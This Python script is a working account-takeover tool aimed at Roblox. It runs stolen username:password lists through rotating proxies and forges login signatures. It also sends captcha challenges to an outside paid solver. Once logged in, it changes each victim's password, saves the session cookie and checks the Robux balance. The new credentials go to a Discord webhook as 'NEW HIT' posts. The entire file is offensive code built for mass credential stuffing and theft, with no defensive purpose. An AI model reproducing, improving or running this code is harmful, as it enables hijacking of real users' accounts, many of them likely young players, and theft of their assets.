from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend
import requests
from tls_client import Session
import time
import json
import base64
import random
import string
import threading
from datetime import datetime
from colorama import Fore
import json
import discord_webhook
from datetime import datetime

config = json.loads(open("config.json").read())

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
THREAD_COUNT = config["threads"]
AUTO_CAP_KEY = config["autocap_key"]
WEBHOOK_ENABLED = config["log_to_webhook"]
WEBHOOK_URL = config["webhook_url"]

lock = threading.Lock()

answer = input("Would you like to clear checked.txt from last time. Say yes if you're checking a new list. Say no if you're continuing to check a previous list. ")

while True:

    if str(answer).lower() == 'yes':

        open("checked.txt", "w", encoding="utf-8").write("")

        break
    
    elif str(answer).lower() == 'no':

        break
    
    else:

        print("That is not a valid answer please answer again.")

        answer = input("Would you like to clear checked.txt from last time. Say yes if you're checking a new list. Say no if you're continuing to check a previous list. ")

with open("checking.txt", "w", encoding="utf-8") as file:

    file.write("")
    
    file.close()

class Output:
    def __init__(this, level):
        this.level = level
        this.color_map = {
            "INFO": (Fore.LIGHTBLUE_EX, "*"),
            "INFO2": (Fore.LIGHTCYAN_EX, "^"),
            "CAPTCHA": (Fore.LIGHTMAGENTA_EX, "C"),
            "ERROR": (Fore.LIGHTRED_EX, "!"),
            "SUCCESS": (Fore.LIGHTGREEN_EX, "$")
        }

    def log(this, *args, **kwargs):
        color, text = this.color_map.get(this.level, (Fore.LIGHTWHITE_EX, this.level))
        time_now = datetime.now().strftime("%H:%M:%S")

        base = f"[{Fore.LIGHTBLACK_EX}{time_now}{Fore.RESET}] ({color}{text.upper()}{Fore.RESET})"
        for arg in args:
            base += f"{Fore.RESET} {arg}"
        if kwargs:
            base += f"{Fore.RESET} {arg}"
        return base
    
def usernameToId(username, proxy):

    proxy_url = f"http://{proxy}"

    proxies = {"http": proxy_url, "https": proxy_url}

    req = requests.post('https://users.roblox.com/v1/usernames/users', json={'usernames': [username]}, proxies=proxies)

    return str(req.json()['data'][0]['id'])

def getAvatarHeadshot(userId, proxy):

    while True:

        try:

            proxy_url = f"http://{proxy}"

            proxies = {"http": proxy_url, "https": proxy_url}

            req = requests.get(f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={userId}&size=720x720&format=Png&isCircular=true', proxies=proxies)

            responseJson = req.json()

            if responseJson['data'][0]['state'] != 'Pending':

                return responseJson['data'][0]['imageUrl']
            
        except:

            pass

def getJoinDate(userId, proxy):

    try:

        proxy_url = f"http://{proxy}"

        proxies = {"http": proxy_url, "https": proxy_url}

        joinDate = requests.get(f"https://users.roblox.com/v1/users/{userId}", proxies=proxies).json()['created'].split('T')[0]

        return joinDate

    except:

        return None
    
def print_thread_safe(text):
    with lock:
        print(text)
    
def string_to_bytes(raw_string):
    return bytes(raw_string, 'utf-8')

def export_public_key_as_spki(public_key):
    spki_bytes = public_key.public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return base64.b64encode(spki_bytes).decode('utf-8')

def generate_signing_key_pair_unextractable():
    private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
    public_key = private_key.public_key()
    return private_key, public_key

def sign(private_key, data):
    signature = private_key.sign(data, ec.ECDSA(hashes.SHA256()))
    return base64.b64encode(signature).decode('utf-8')

class Changer:

    def __init__(self):
        
        self.lock = threading.Lock()

    def return_auth_intent(self, proxy=None):
        try:
            headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                "Content-Type": "application/json;charset=UTF-8",
                'Sec-Ch-Ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "User-Agent": USER_AGENT
            }
            if proxy == None:
                proxy_url = f"http://{proxy}"
                key_pair = generate_signing_key_pair_unextractable()
                private_key, public_key = key_pair
                client_public_key = export_public_key_as_spki(public_key)
                client_epoch_timestamp = str(int(time.time()))
                response = requests.get("https://apis.roblox.com/hba-service/v1/getServerNonce", headers=headers)
                server_nonce = response.text.strip('"')
                payload = f"{client_public_key}|{client_epoch_timestamp}|{server_nonce}"
                sai_signature = sign(private_key, string_to_bytes(payload))
                result = {
                    "clientEpochTimestamp": client_epoch_timestamp,
                    "clientPublicKey": client_public_key,
                    "saiSignature": sai_signature,
                    "serverNonce": server_nonce
                }
                return result
            else:
                proxy_url = f"http://{proxy}"
                key_pair = generate_signing_key_pair_unextractable()
                private_key, public_key = key_pair
                client_public_key = export_public_key_as_spki(public_key)
                client_epoch_timestamp = str(int(time.time()))
                response = requests.get("https://apis.roblox.com/hba-service/v1/getServerNonce", headers=headers, proxies={"http": proxy_url, "https": proxy_url})
                server_nonce = response.text.strip('"')
                payload = f"{client_public_key}|{client_epoch_timestamp}|{server_nonce}"
                sai_signature = sign(private_key, string_to_bytes(payload))
                result = {
                    "clientEpochTimestamp": client_epoch_timestamp,
                    "clientPublicKey": client_public_key,
                    "saiSignature": sai_signature,
                    "serverNonce": server_nonce
                }
                return result
        except:
            return None
        
    def getRandomProxy(self):

        with open("proxies.txt", "r", encoding="utf-8") as file:

            lines = file.readlines()

            file.close()

        proxies = [line.strip("\n") for line in lines]

        return random.choice(proxies)
    
    def getRandomGoodProxy(self):

        with open("goodProxies.txt", "r", encoding="utf-8") as file:

            lines = file.readlines()

            file.close()

        proxies = [line.strip("\n") for line in lines]

        return random.choice(proxies)
    
    def getCombo(self):

        with open("accounts.txt", "r", encoding="utf-8") as file:

            lines = file.readlines()

            file.close()

        accounts = [line.strip("\n") for line in lines]

        while True:

            account = random.choice(accounts).strip("\n")

            if account not in open("checked.txt", "r", encoding="utf-8").read() and account not in open("checking.txt", "r", encoding="utf-8").read():

                return account.split(":")[0], account.split(":")[1]

    def changePassword(self):
            
        while True:

            try:

                with open("checked.txt", "r", encoding="utf-8") as file:

                    lines = file.readlines()

                    file.close()

                with open("accounts.txt", "r", encoding="utf-8") as file:

                    lines2 = file.readlines()

                    file.close()

                if len(lines) >= len(lines2):

                    break

                username, password = self.getCombo()
                
                with self.lock:

                    with open("checking.txt", "a", encoding="utf-8") as file:

                        file.write(f"{username}:{password}\n")

                        file.close()

                session = Session(
                    client_identifier="chrome_118",
                    random_tls_extension_order=True
                )

                session.timeout_seconds = 3

                session.headers = {
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                    "Content-Type": "application/json;charset=UTF-8",
                    "Origin": "https://www.roblox.com",
                    "Referer": "https://www.roblox.com/",
                    'Sec-Ch-Ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-site",
                    "User-Agent": USER_AGENT
                }

                proxy = self.getRandomProxy()

                session.proxies = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }

                userId = usernameToId(username, proxy)

                authIndent = self.return_auth_intent(proxy=proxy)

                payload = {
                    "ctype": "Username",
                    "cvalue": username,
                    "password": password,
                    "secureAuthenticationIntent": authIndent
                }

                req = session.post("https://auth.roblox.com/v2/login", json=payload)

                if req.status_code == 429:

                    raise ValueError("Rate limited.")

                csrf = req.headers.get("X-Csrf-Token")

                session.headers["X-Csrf-Token"] = csrf

                req = session.post("https://auth.roblox.com/v2/login", json=payload)

                if 'twoStepVerificationData' in req.text:

                    with self.lock:

                        with open("checking.txt", 'r') as file:

                            lines = file.readlines()

                            lines = [line for line in lines if line.strip() != f"{username}:{password}"]

                            file.close()

                        with open("checking.txt", 'w') as file:

                            file.writelines(lines)

                            file.close()

                        with open("2fa.txt", "a", encoding="utf-8") as file:

                            file.write(f"{username}:{password}\n")

                            file.close()
                        
                        with open("checked.txt", "a", encoding="utf-8") as file:

                            file.write(f"{username}:{password}\n")

                            file.close()

                        print_thread_safe(Output('ERROR').log("Locked account for username:", username))

                if req.status_code == 429:

                    raise ValueError("Rate limited.")

                if "Incorrect username or password" in req.text:

                    with self.lock:

                        with open("checking.txt", 'r') as file:

                            lines = file.readlines()

                            lines = [line for line in lines if line.strip() != f"{username}:{password}"]

                            file.close()

                        with open("checking.txt", 'w') as file:

                            file.writelines(lines)

                            file.close()

                        with open("checked.txt", "a", encoding="utf-8") as file:

                            file.write(f"{username}:{password}\n")

                            file.close()

                    print_thread_safe(Output('ERROR').log("Incorrect password for username:", username))

                cookieVal = '; '.join([f"{key}={value}" for key, value in req.cookies.items()])

                session.headers["Cookie"] = cookieVal

                data = json.loads(base64.b64decode(req.headers.get("Rblx-Challenge-Metadata")).decode())

                blob = data["dataExchangeBlob"]

                print_thread_safe(Output("INFO").log("Solving captcha..."))

                reqToSolve = requests.post("http://paid3.daki.cc:4000/solve", json={
                    "api_key": AUTO_CAP_KEY, "surl": "https://roblox-api.arkoselabs.com", "href": "https://www.roblox.com/arkose/iframe", "pkey": "476068BF-9607-4799-B53D-966BE98E2B81", "site": "https://www.roblox.com/", "windowStructure": "[[],[[]]]", "windowTreeIndex": "[1, 0]", "ancestorOriginList": '["https://www.roblox.com", "https://www.roblox.com"]', "proxy": proxy, "extraData": {"blob": blob}, "capiMode": "inline", "jsfEnabled": False, "style": "default"
                })

                reqToSolveJson = reqToSolve.json()

                token = reqToSolveJson["token"]

                if token == None:

                    raise ValueError("Failed to solve captcha.")
                
                print_thread_safe(Output("SUCCESS").log("Captcha solved! Token:", f"{token},", "Challenge ID:", req.headers.get("Rblx-Challenge-Id")))
            
                metadata = json.dumps({
                    "unifiedCaptchaId": data["unifiedCaptchaId"],
                    "captchaToken": token,
                    "actionType": "Login"
                })

                payload = json.dumps({
                    "challengeId": req.headers.get("Rblx-Challenge-Id"),
                    "challengeMetadata": metadata,
                    "challengeType": "captcha"
                })

                req = session.post("https://apis.roblox.com/challenge/v1/continue", data=payload)

                print_thread_safe(Output("INFO").log("Continue API result:", req.text))

                if req.status_code != 200:

                    raise ValueError("Rejected token by continue API.")
                
                session.headers["Rblx-Challenge-Id"] = data["sharedParameters"]["genericChallengeId"]

                session.headers["Rblx-Challenge-Metadata"] = base64.b64encode(metadata.encode()).decode()

                session.headers["Rblx-Challenge-Type"] = "captcha"

                payload = {
                    "ctype": "Username",
                    "cvalue": username,
                    "password": password,
                    "secureAuthenticationIntent": authIndent
                }

                req = session.post("https://auth.roblox.com/v2/login", json=payload)

                if 'twoStepVerificationData' in req.text:

                    with self.lock:

                        with open("checking.txt", 'r') as file:

                            lines = file.readlines()

                            lines = [line for line in lines if line.strip() != f"{username}:{password}"]

                            file.close()

                        with open("checking.txt", 'w') as file:

                            file.writelines(lines)

                            file.close()

                        with open("2fa.txt", "a", encoding="utf-8") as file:

                            file.write(f"{username}:{password}\n")

                            file.close()
                        
                        with open("checked.txt", "a", encoding="utf-8") as file:

                            file.write(f"{username}:{password}\n")

                            file.close()

                        print_thread_safe(Output('ERROR').log("Locked account for username:", username))

                if 'Account has been locked' in req.text:

                    with self.lock:

                        with open("checking.txt", 'r') as file:

                            lines = file.readlines()

                            lines = [line for line in lines if line.strip() != f"{username}:{password}"]

                            file.close()

                        with open("checking.txt", 'w') as file:

                            file.writelines(lines)

                            file.close()

                        with open("checked.txt", "a", encoding="utf-8") as file:

                            file.write(f"{username}:{password}\n")

                            file.close()

                    print_thread_safe(Output('ERROR').log("Account locked. Username:", username))

                if "Incorrect username or password" in req.text:

                    with self.lock:

                        with open("checking.txt", 'r') as file:

                            lines = file.readlines()

                            lines = [line for line in lines if line.strip() != f"{username}:{password}"]

                            file.close()

                        with open("checking.txt", 'w') as file:

                            file.writelines(lines)

                            file.close()

                        with open("checked.txt", "a", encoding="utf-8") as file:

                            file.write(f"{username}:{password}\n")

                            file.close()

                    print_thread_safe(Output('ERROR').log("Incorrect password for username:", username))

                if req.status_code == 429:

                    raise ValueError("Rate limited.")

                if req.status_code == 200:

                    print_thread_safe(Output("SUCCESS").log("Logged into the account:", username))

                    try:

                        accountCookie = str(req.headers.get('Set-Cookie')[1]).split('.ROBLOSECURITY=')[1].split(';')[0]

                        cookieVal += f'; .ROBLOSECURITY={accountCookie}'

                        session.headers["Cookie"] = cookieVal

                        session.headers.pop("X-Csrf-Token")

                        session.headers.pop("Rblx-Challenge-Type")

                        session.headers.pop("Rblx-Challenge-Id")

                        session.headers.pop("Rblx-Challenge-Metadata")

                        newPass = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(10, 18)))

                        payload = {
                            "currentPassword": password,
                            "newPassword": newPass
                        }

                        req = session.post('https://auth.roblox.com/v2/user/passwords/change', json=payload)

                        newCsrf = req.headers.get("X-Csrf-Token")

                        session.headers["X-Csrf-Token"] = newCsrf

                        req = session.post('https://auth.roblox.com/v2/user/passwords/change', json=payload)

                        if str(req.text) == '{}':

                            print_thread_safe(Output("SUCCESS").log("Successfully changed password for the account:", username))

                            try:

                                accountCookie = str(req.headers.get('Set-Cookie')[0]).split('.ROBLOSECURITY=')[1].split(';')[0]

                                with self.lock:

                                    with open("checking.txt", 'r') as file:

                                        lines = file.readlines()

                                        lines = [line for line in lines if line.strip() != f"{username}:{password}"]

                                        file.close()

                                    with open("checking.txt", 'w') as file:

                                        file.writelines(lines)

                                        file.close()

                                    with open("checked.txt", "a", encoding="utf-8") as file:

                                        file.write(f"{username}:{password}\n")

                                        file.close()

                                with self.lock:

                                    with open("changed.txt", "a", encoding="utf-8") as file:

                                        file.write(f"{username}:{newPass}:{accountCookie}\n")

                                        file.close()

                                    try:

                                        session.headers.pop("Origin")

                                        session.headers.pop("Referer")

                                        session.headers.pop("X-Csrf-Token")

                                        headers = {
                                            "Cookie": f".ROBLOSECURITY={accountCookie}"
                                        }

                                        robux = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers, proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"}).json()["RobuxBalance"]

                                        if int(robux) > 0:

                                            with open(f'robux{str(robux)}.txt', "a", encoding="utf-8") as file:

                                                file.write(f"{username}:{newPass}:{accountCookie}\n")

                                                file.close()

                                        if WEBHOOK_ENABLED:

                                            webhook = discord_webhook.DiscordWebhook(url=WEBHOOK_URL, content="@here\n")

                                            embed = discord_webhook.DiscordEmbed(title="NEW HIT [VALID]", description=f"```Username: {username}\n\nPassword: {newPass}\n\nJoin Date: {getJoinDate(userId, proxy)}\n\nRobux: {str(robux)}```")

                                            embed.set_color("2ecc71")

                                            embed.set_thumbnail(getAvatarHeadshot(userId, proxy))

                                            embed.set_footer(f"Made by samfr._ | {datetime.now().strftime('%H:%M')} {datetime.now().strftime('%m/%d/%Y')}")

                                            webhook.add_embed(embed=embed)

                                            webhook.execute()

                                    except:

                                        if WEBHOOK_ENABLED:

                                            webhook = discord_webhook.DiscordWebhook(url=WEBHOOK_URL, content="@here\n")

                                            embed = discord_webhook.DiscordEmbed(title="NEW HIT [VALID]", description=f"```Username: {username}\n\nPassword: {newPass}\n\nJoin Date: {getJoinDate(userId, proxy)}```")

                                            embed.set_color("2ecc71")

                                            embed.set_thumbnail(getAvatarHeadshot(userId, proxy))

                                            embed.set_footer(f"Made by samfr._ | {datetime.now().strftime('%H:%M')} {datetime.now().strftime('%m/%d/%Y')}")

                                            webhook.add_embed(embed=embed)

                                            webhook.execute()

                                        pass
                            
                            except:

                                with self.lock:

                                    with open("checking.txt", 'r') as file:

                                        lines = file.readlines()

                                        lines = [line for line in lines if line.strip() != f"{username}:{password}"]

                                        file.close()

                                    with open("checking.txt", 'w') as file:

                                        file.writelines(lines)

                                        file.close()

                                    with open("checked.txt", "a", encoding="utf-8") as file:

                                        file.write(f"{username}:{password}\n")

                                        file.close()

                                with self.lock:

                                    with open("changedButError.txt", "a", encoding="utf-8") as file:

                                        file.write(f"{username}:{newPass}\n")

                                        file.close()

                        else:

                            with self.lock:

                                with open("checking.txt", 'r') as file:

                                    lines = file.readlines()

                                    lines = [line for line in lines if line.strip() != f"{username}:{password}"]

                                    file.close()

                                with open("checking.txt", 'w') as file:

                                    file.writelines(lines)

                                    file.close()

                                with open("checked.txt", "a", encoding="utf-8") as file:

                                    file.write(f"{username}:{password}\n")

                                    file.close()

                            with self.lock:

                                with open("validButError.txt", "a", encoding="utf-8") as file:

                                    file.write(f"{username}:{password}\n")

                                    file.close()

                    except:

                        with self.lock:

                            with open("checking.txt", 'r') as file:

                                lines = file.readlines()

                                lines = [line for line in lines if line.strip() != f"{username}:{password}"]

                                file.close()

                            with open("checking.txt", 'w') as file:

                                file.writelines(lines)

                                file.close()

                            with open("checked.txt", "a", encoding="utf-8") as file:

                                file.write(f"{username}:{password}\n")

                                file.close()

                        with self.lock:

                            with open("validButError.txt", "a", encoding="utf-8") as file:

                                file.write(f"{username}:{password}\n")

                                file.close()

                elif req.status_code != 200 and req.status_code != 429 and 'Account has been locked' not in req.text and 'Incorrect username or password' not in req.text:

                    with self.lock:

                        with open("checking.txt", 'r') as file:

                            lines = file.readlines()

                            lines = [line for line in lines if line.strip() != f"{username}:{password}"]

                            file.close()

                        with open("checking.txt", 'w') as file:

                            file.writelines(lines)

                            file.close()

                        with open("checked.txt", "a", encoding="utf-8") as file:

                            file.write(f"{username}:{password}\n")

                            file.close()
            
            except Exception as e:

                with open("checking.txt", 'r') as file:

                    lines = file.readlines()

                    lines = [line for line in lines if line.strip() != f"{username}:{password}"]

                    file.close()

                with open("checking.txt", 'w') as file:

                    file.writelines(lines)

                    file.close()

                print_thread_safe(Output("ERROR").log(str(e)))

    def start_changing(self):

        threads = []

        for _ in range(THREAD_COUNT):

            t = threading.Thread(target=self.changePassword)

            t.start()

            threads.append(t)

        for thread in threads:

            thread.join()

        print_thread_safe(Output("SUCCESS").log("All accounts have finished being checked!"))

if __name__ == "__main__":

    Changer().start_changing()